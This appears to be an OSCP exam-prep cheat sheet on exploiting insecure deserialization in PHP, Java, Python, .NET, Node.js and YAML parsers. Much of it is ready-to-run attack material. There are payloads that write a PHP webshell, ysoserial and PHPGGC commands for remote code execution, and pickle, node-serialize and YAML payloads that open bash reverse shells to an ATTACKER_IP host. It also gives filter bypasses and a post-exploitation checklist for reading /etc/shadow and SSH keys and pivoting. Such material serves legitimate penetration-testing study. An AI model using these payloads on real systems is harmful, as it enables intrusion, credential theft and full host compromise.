# Insecure Deserialization — Complete OSCP Methodology



---

## Table of Contents

1. [What Is Deserialization & Why It Matters](#1-what-is-deserialization--why-it-matters)
2. [Detection — Finding Serialized Data](#2-detection--finding-serialized-data)
3. [PHP Deserialization](#3-php-deserialization)
4. [Java Deserialization](#4-java-deserialization)
5. [Python Deserialization (Pickle)](#5-python-deserialization-pickle)
6. [.NET Deserialization](#6-net-deserialization)
7. [Node.js Deserialization](#7-nodejs-deserialization)
8. [YAML Deserialization](#8-yaml-deserialization)
9. [Filter Bypass Techniques](#9-filter-bypass-techniques)
10. [Privilege Escalation via Deserialization](#10-privilege-escalation-via-deserialization)
11. [Tools Reference](#11-tools-reference)
12. [Master Checklist](#12-master-checklist)
13. [External References](#13-external-references)

---

## 1. What Is Deserialization & Why It Matters

**Serialization** = converting an object to a byte stream (for storage/transfer)
**Deserialization** = converting that byte stream back to an object

**Why it's dangerous:** When an app deserializes user-controlled data without validation, an attacker can inject a crafted object that executes code during reconstruction.

**The attack chain:**
```
User-controlled serialized data
  → App deserializes it
    → Magic methods fire automatically (__wakeup, __destruct, readObject, __reduce__)
      → Gadget chain executes
        → RCE / file read / privilege escalation
```

---

## 2. Detection — Finding Serialized Data

### Where to Look

- **Cookies** — base64 or hex-encoded blobs
- **Hidden form fields** — often named `viewstate`, `state`, `data`, `object`
- **API request/response bodies** — especially non-JSON formats
- **URL parameters** — base64-encoded values
- **File uploads** — serialized objects in files (.ser, .pkl)
- **JWT tokens** — claims with serialized objects
- **HTTP headers** — custom headers carrying state

### Identifying the Format

| Signature | Language / Format |
|---|---|
| `O:4:"User":2:{` | **PHP** serialized |
| `a:2:{i:0;s:5:"hello"` | **PHP** serialized array |
| `rO0AB` (base64) / `AC ED 00 05` (hex) | **Java** serialized |
| `gASV` / `\x80\x03\x04\x95` | **Python Pickle** |
| `AAEAAAD/////` (base64) | **.NET BinaryFormatter** |
| `{"$type":"Namespace.Class, Assembly"` | **.NET JSON (TypeNameHandling)** |
| `!!python/object` | **Python YAML** |
| `!!java/object` | **Java SnakeYAML** |
| `<ViewState>` or `__VIEWSTATE=` | **ASP.NET ViewState** |

### Quick Detection Test

```bash
# Decode base64 cookie/parameter
echo "cookie_value_here" | base64 -d

# Check for PHP serialization
echo "cookie_value_here" | base64 -d | grep -aP 'O:\d+:|a:\d+:{|s:\d+:'

# Check for Java serialization (magic bytes)
echo "cookie_value_here" | base64 -d | xxd | head -1
# Look for: ac ed 00 05

# Check for Python pickle
echo "cookie_value_here" | base64 -d | xxd | head -1
# Look for: 80 03 or 80 04 or 80 05
```

---

## 3. PHP Deserialization

### PHP Serialized Format

```php
// String:   s:5:"hello";
// Integer:  i:42;
// Boolean:  b:1;       (1=true, 0=false)
// NULL:     N;
// Array:    a:2:{i:0;s:3:"foo";i:1;s:3:"bar";}
// Object:   O:4:"User":2:{s:4:"name";s:5:"admin";s:4:"role";s:5:"admin";}
//           O:<name_length>:"<class_name>":<num_properties>:{<properties>}
```

### Magic Methods (Triggered Automatically)

| Method | When it fires |
|---|---|
| `__wakeup()` | When object is deserialized (unserialize()) |
| `__destruct()` | When object is destroyed (end of script) |
| `__toString()` | When object is used as a string |
| `__call()` | When an inaccessible method is called |
| `__get()` | When an inaccessible property is read |

### Attack 1 — Modify Object Properties

If the app uses a serialized cookie for session/auth:

```
Original cookie (base64 decoded):
O:4:"User":2:{s:8:"username";s:6:"carlos";s:5:"admin";b:0;}

Tampered:
O:4:"User":2:{s:8:"username";s:5:"admin";s:5:"admin";b:1;}
```

```bash
# Encode and set as cookie
echo -n 'O:4:"User":2:{s:8:"username";s:5:"admin";s:5:"admin";b:1;}' | base64
```

### Attack 2 — Exploit Magic Methods

If the source code shows a class with dangerous `__destruct()` or `__wakeup()`:

```php
// Vulnerable class (from source code review)
class LogFile {
    public $filename;
    public $content;
    public function __destruct() {
        file_put_contents($this->filename, $this->content);
    }
}
```

**Exploit — write a webshell:**

```php
<?php
class LogFile {
    public $filename = '/var/www/html/shell.php';
    public $content = '<?php system($_GET["cmd"]); ?>';
}

echo serialize(new LogFile());
// O:7:"LogFile":2:{s:8:"filename";s:29:"/var/www/html/shell.php";s:7:"content";s:30:"<?php system($_GET["cmd"]); ?>";}

echo base64_encode(serialize(new LogFile()));
?>
```

```bash
# Generate payload
php -r 'class LogFile { public $filename="/var/www/html/shell.php"; public $content="<?php system(\$_GET[\"cmd\"]); ?>"; } echo base64_encode(serialize(new LogFile()));'
```

### Attack 3 — PHP Generic Gadget Chains (PHPGGC)

When you can't find the gadget yourself, use **PHPGGC** — pre-built chains for popular frameworks:

```bash
# List available gadgets
phpggc -l

# List gadgets for a specific framework
phpggc -l Laravel
phpggc -l Symfony
phpggc -l WordPress

# Generate RCE payload
phpggc Laravel/RCE1 system "id" -b          # base64 output
phpggc Symfony/RCE4 exec "id" -b
phpggc Monolog/RCE1 system "id" -b

# Reverse shell
phpggc Laravel/RCE1 system "bash -c 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1'" -b

# File write
phpggc Laravel/RCE2 system "echo '<?php system(\$_GET[\"cmd\"]); ?>' > /var/www/html/shell.php" -b

# URL-safe output
phpggc Laravel/RCE1 system "id" -u          # URL encoded
```

### Phar Deserialization

PHP `phar://` wrapper triggers deserialization when reading Phar metadata:

```php
// If the app uses file functions on user input:
// file_exists(), is_dir(), fopen(), file_get_contents(), file()
// include(), require(), highlight_file()

// Use phar:// to trigger deserialization:
phar:///var/www/html/uploads/evil.phar
phar://uploads/evil.jpg                    // renamed .phar to .jpg
```

```bash
# Generate Phar with PHPGGC
phpggc Monolog/RCE1 system "id" -p phar -o exploit.phar

# Rename to bypass extension filter
mv exploit.phar exploit.jpg
# Upload, then trigger with: phar://uploads/exploit.jpg
```

---

## 4. Java Deserialization

### Detection

```
Magic bytes (hex): AC ED 00 05
Base64 starts with: rO0AB
```

Common locations:
- Cookies (especially Java apps, JBoss, WebLogic, Jenkins)
- `Content-Type: application/x-java-serialized-object`
- RMI, JMX, JMS endpoints
- HTTP parameters with base64 blobs

### ysoserial — The Go-To Tool

```bash
# Download ysoserial
wget https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar

# List available gadget chains
java -jar ysoserial-all.jar --help

# Generate RCE payloads (try each until one works — depends on target's classpath)

# CommonsCollections (most common)
java -jar ysoserial-all.jar CommonsCollections1 "id" | base64 -w0
java -jar ysoserial-all.jar CommonsCollections5 "id" | base64 -w0
java -jar ysoserial-all.jar CommonsCollections6 "id" | base64 -w0
java -jar ysoserial-all.jar CommonsCollections7 "id" | base64 -w0

# Other chains
java -jar ysoserial-all.jar CommonsBeanutils1 "id" | base64 -w0
java -jar ysoserial-all.jar Spring1 "id" | base64 -w0
java -jar ysoserial-all.jar Groovy1 "id" | base64 -w0
java -jar ysoserial-all.jar Hibernate1 "id" | base64 -w0

# Reverse shell (bash doesn't work directly — use runtime exec)
java -jar ysoserial-all.jar CommonsCollections1 \
  "bash -c {echo,BASE64_ENCODED_PAYLOAD}|{base64,-d}|{bash,-i}" | base64 -w0

# Or use a staged approach:
# 1. Download reverse shell script
java -jar ysoserial-all.jar CommonsCollections1 \
  "curl http://ATTACKER/shell.sh -o /tmp/shell.sh" | base64 -w0

# 2. Execute it
java -jar ysoserial-all.jar CommonsCollections1 \
  "bash /tmp/shell.sh" | base64 -w0
```

### Java Reverse Shell Helper

Java's `Runtime.exec()` doesn't handle pipes/redirects. Encode the command:

```bash
# Create shell.sh on your attacker machine
echo "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1" > shell.sh
python3 -m http.server 80

# Or use base64 encoding trick
echo "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1" | base64
# Use the output in:
# bash -c {echo,ENCODED}|{base64,-d}|{bash,-i}
```

### BurpSuite Extension

- Install **Java Deserialization Scanner** from BApp Store
- It automatically detects and tests Java deserialization points

### Common Vulnerable Software

| Software | Endpoint / Note |
|---|---|
| Apache Commons Collections | Classpath dependency |
| JBoss | `/invoker/JMXInvokerServlet` |
| WebLogic | `/wls-wsat/`, `/_async/`, T3 protocol |
| Jenkins | CLI port, `/cli/` |
| Apache Tomcat | AJP (Ghostcat), session persistence |
| Spring | Spring remoting endpoints |

---

## 5. Python Deserialization (Pickle)

### Detection

```
Magic bytes: \x80\x03, \x80\x04, \x80\x05 (protocol versions)
Base64: gASV (protocol 4), gAJ (protocol 2)
```

Look for:
- `pickle.loads()` called on user input
- Flask sessions with `.` delimiters (itsdangerous signed cookies)
- Any base64 blob in Python web apps (Django, Flask)

### Basic RCE Payload

```python
import pickle
import base64
import os

class Exploit:
    def __reduce__(self):
        return (os.system, ('id',))

payload = base64.b64encode(pickle.dumps(Exploit())).decode()
print(payload)
```

### Reverse Shell Payload

```python
import pickle
import base64
import os

class Exploit:
    def __reduce__(self):
        cmd = "bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'"
        return (os.system, (cmd,))

payload = base64.b64encode(pickle.dumps(Exploit())).decode()
print(payload)
```

### Alternative — subprocess for output capture

```python
import pickle
import base64
import subprocess

class Exploit:
    def __reduce__(self):
        return (subprocess.check_output, (['id'],))

payload = base64.b64encode(pickle.dumps(Exploit())).decode()
print(payload)
```

### One-Liner

```bash
python3 -c "import pickle,base64,os; \
class E: \
    def __reduce__(self): return (os.system,('id',)); \
print(base64.b64encode(pickle.dumps(E())).decode())"
```

---

## 6. .NET Deserialization

### Detection

```
BinaryFormatter magic (base64): AAEAAAD/////
JSON with $type:               {"$type":"System.Type, Assembly", ...}
ViewState:                      __VIEWSTATE parameter (base64)
SoapFormatter:                  XML with <SOAP-ENV>
```

### ysoserial.net

```powershell
# Download from: https://github.com/pwntester/ysoserial.net

# Generate payloads
ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -c "whoami" -o base64
ysoserial.exe -g WindowsIdentity -f BinaryFormatter -c "calc.exe" -o base64
ysoserial.exe -g PSObject -f BinaryFormatter -c "whoami" -o base64

# JSON.NET
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "whoami"

# For ViewState (needs machineKey from web.config)
ysoserial.exe -p ViewState -g TypeConfuseDelegate -c "whoami" \
  --validationalg="SHA1" --validationkey="KEY" \
  --generator="GENERATOR" --viewstateuserkey="" \
  --isdebug --islegacy
```

### ViewState Attacks

```bash
# Check if ViewState is encrypted/signed
# Look at __VIEWSTATE value — decode base64
echo "__VIEWSTATE_VALUE" | base64 -d | xxd | head

# If NOT signed (no MAC validation):
# Modify the serialized data directly

# If signed but you have machineKey (from web.config LFI):
# Use ysoserial.net with the key

# Check for known machineKeys:
# https://github.com/NotSoSecure/Blacklist3r
# AspDotNetWrapper tool to bruteforce/identify machineKey
```

---

## 7. Node.js Deserialization

### Detection

Look for `node-serialize`, `serialize-javascript`, or any `unserialize()` call on user input.

### node-serialize RCE

`node-serialize` allows Immediately Invoked Function Expressions (IIFE):

```json
{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('id',function(error,stdout,stderr){/* */})}()"}
```

### Exploit

```javascript
// Payload with reverse shell
var payload = {
    "rce": "_$$ND_FUNC$$_function(){require('child_process').exec('bash -c \"bash -i >& /dev/tcp/ATTACKER/4444 0>&1\"')}()"
};

// Serialize and encode
var serialize = require('node-serialize');
var encoded = Buffer.from(serialize.serialize(payload)).toString('base64');
console.log(encoded);
```

```bash
# Quick payload generation
node -e "var s=require('node-serialize');var p={'rce':'_\$\$ND_FUNC\$\$_function(){require(\"child_process\").exec(\"id\")}()'};console.log(Buffer.from(s.serialize(p)).toString('base64'))"
```

---

## 8. YAML Deserialization

### Python — PyYAML

```yaml
# RCE via !!python/object/apply
!!python/object/apply:os.system ['id']

# Subprocess
!!python/object/apply:subprocess.check_output [['id']]

# Multi-line command
!!python/object/apply:os.system
- "bash -c 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1'"

# Alternative
!!python/object/new:os.system ['id']
```

> Only works with `yaml.load()` (unsafe). `yaml.safe_load()` is not vulnerable.

### Java — SnakeYAML

```yaml
# RCE via remote class loading
!!javax.script.ScriptEngineManager [
  !!java.net.URLClassLoader [[
    !!java.net.URL ["http://ATTACKER/"]
  ]]
]
```

```bash
# Host a malicious JAR on your server
# The YAML payload makes the target load and execute it
```

### Ruby — Psych

```yaml
--- !ruby/object:Gem::Installer
i: x
--- !ruby/object:Gem::SpecFetcher
i: y
--- !ruby/object:Gem::Requirement
requirements:
  !ruby/object:Gem::Package::TarReader
  io: &1 !ruby/object:Net::BufferedIO
    io: &1 !ruby/object:Gem::Package::TarReader::Entry
       read: 0
       header: "abc"
    debug_output: &1 !ruby/object:Net::WriteAdapter
       socket: &1 !ruby/object:Gem::RequestSet
           sets: !ruby/object:Net::WriteAdapter
               socket: !ruby/module 'Kernel'
               method_id: :system
           git_set: id
       method_id: :resolve
```

---

## 9. Filter Bypass Techniques

### PHP

```php
// __wakeup() bypass (CVE-2016-7124, PHP < 5.6.25 / < 7.0.10)
// Set property count HIGHER than actual — __wakeup() is skipped
// Original: O:4:"User":2:{...}
// Bypass:   O:4:"User":3:{...}    ← 3 instead of 2

// Bypass class name blocklist — use case variation (doesn't work in PHP, class names are case-insensitive)

// Use S: instead of s: for hex-encoded strings
// s:5:"admin" → S:5:"\61dmin"    (hex-encoded 'a')

// Use + before class name length
// O:4:"User" → O:+4:"User"
```

### Java

```bash
# Different serialization protocols — try each ysoserial chain
# The gadget chain that works depends on libraries in classpath

# If CommonsCollections blocked, try:
# - CommonsBeanutils1
# - Spring1, Spring2
# - Groovy1
# - Hibernate1, Hibernate2
# - JRMPClient/Listener (out-of-band)
# - C3P0
# - Jdk7u21
```

### General

- **URL encode** the serialized data
- **Double encode** if the app decodes twice
- **Gzip + Base64** if the app expects compressed data
- **Change content type** — sometimes `application/xml` processes differently from `application/json`
- **Nested serialization** — serialize a serialized payload

---

## 10. Privilege Escalation via Deserialization

### From Deserialization to Full Compromise

```
1. RCE via deserialization
   → whoami (find current user)
   → Check sudo -l, SUID, cron, etc. (standard privesc enum)
   → Escalate to root

2. File read via deserialization
   → Read /etc/shadow, SSH keys, config files with credentials
   → Use creds to escalate

3. Object property manipulation (no RCE needed)
   → Change role=admin in serialized session
   → Access admin panel
   → Find file upload, command execution, etc.
```

### Chaining

- Deserialization → webshell → reverse shell → privesc
- Deserialization → read DB config → connect to DB → extract creds → SSH as user → privesc
- Deserialization → read /etc/shadow → crack hashes → su to root

---

## 11. Tools Reference

| Tool | Language | Purpose |
|---|---|---|
| **PHPGGC** | PHP | Pre-built gadget chains for PHP frameworks |
| **ysoserial** | Java | Pre-built gadget chains for Java |
| **ysoserial.net** | .NET | Pre-built gadget chains for .NET |
| **marshalsec** | Java | Alternative to ysoserial, extra protocols |
| **GadgetInspector** | Java | Automated gadget chain discovery |
| **Burp Java Deserialization Scanner** | Java | Detect & exploit in Burp |
| **peas** | Python | Pickle exploitation |
| **Blacklist3r** | .NET | ViewState key brute-force |

```bash
# Install PHPGGC
git clone https://github.com/ambionics/phpggc.git
cd phpggc && chmod +x phpggc

# Install ysoserial
wget https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar

# Install marshalsec
git clone https://github.com/mbechler/marshalsec.git
cd marshalsec && mvn clean package -DskipTests
```

---

## 12. Master Checklist

### Detection

- [ ] Check all cookies for serialized data (base64 decode everything)
- [ ] Check hidden form fields and URL parameters
- [ ] Identify the serialization format (PHP, Java, Python, .NET)
- [ ] Check `Content-Type` headers for serialization-specific types
- [ ] Look for Java magic bytes (`AC ED 00 05` / `rO0AB`)
- [ ] Look for PHP serialization patterns (`O:`, `a:`, `s:`)
- [ ] Check for `__VIEWSTATE` in ASP.NET apps
- [ ] Inspect JWT tokens for serialized claims

### PHP

- [ ] Decode and inspect serialized cookies/parameters
- [ ] Try modifying object properties (role, admin, access level)
- [ ] Check for `__wakeup()` bypass (property count manipulation)
- [ ] Identify frameworks → use PHPGGC for gadget chains
- [ ] Test Phar deserialization if file functions accept user input
- [ ] Try `S:` hex strings and `+` prefix for bypass

### Java

- [ ] Identify Java serialization in cookies/parameters/headers
- [ ] Try all ysoserial gadget chains (CommonsCollections first)
- [ ] Check for known vulnerable software (JBoss, WebLogic, Jenkins)
- [ ] Test T3 protocol for WebLogic
- [ ] Test JRMP for out-of-band
- [ ] Use Burp extension for automated detection

### Python

- [ ] Look for Pickle signatures in cookies/parameters
- [ ] Generate `__reduce__` RCE payload
- [ ] Test `yaml.load()` with YAML payloads
- [ ] Check Flask session cookies (itsdangerous)

### .NET

- [ ] Check for `__VIEWSTATE` — is it encrypted/signed?
- [ ] If machineKey available (web.config LFI) → ysoserial.net ViewState
- [ ] Check for `TypeNameHandling` in JSON.NET
- [ ] Test BinaryFormatter payloads

### Exploitation

- [ ] Achieve RCE → get reverse shell
- [ ] Read sensitive files (config, shadow, SSH keys)
- [ ] Write webshell to web root
- [ ] Extract database credentials from config files
- [ ] Escalate privileges from initial foothold
- [ ] Pivot — use compromised host to reach internal network

---

## 13. External References

- [PayloadsAllTheThings — Insecure Deserialization](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Insecure%20Deserialization)
- [PortSwigger — Insecure Deserialization](https://portswigger.net/web-security/deserialization)
- [HackTricks — Deserialization](https://book.hacktricks.wiki/en/pentesting-web/deserialization/index.html)
- [PHPGGC — PHP Gadget Chains](https://github.com/ambionics/phpggc)
- [ysoserial — Java Gadget Chains](https://github.com/frohoff/ysoserial)
- [ysoserial.net — .NET Gadget Chains](https://github.com/pwntester/ysoserial.net)
- [OWASP — Deserialization Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html)
